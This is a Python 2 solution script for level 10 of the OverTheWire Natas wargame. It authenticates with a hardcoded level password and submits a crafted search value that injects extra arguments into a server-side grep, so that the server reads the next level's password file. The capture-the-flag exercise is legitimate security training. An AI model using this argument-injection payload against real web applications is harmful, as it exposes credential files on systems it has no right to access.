# Natas10 python solution
# By Emil 'Dota' Bak, 2019

import requests
from bs4 import BeautifulSoup

# ***********************************************
URL = "http://natas10.natas.labs.overthewire.org"

auth_name = 'natas10'
auth_pass = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# This time around, the user can't inject code with all known characters,
# however, enough characters are allowed to re-direct
# the 'grep' command to another file...
INPUT = "\"\" /etc/natas_webpass/natas11 #"

DATA = dict(needle=INPUT, submit="submit")

r = s.post(URL, data=DATA)

soup  = BeautifulSoup(r.text,"html.parser")
print soup.find('pre').contents[0]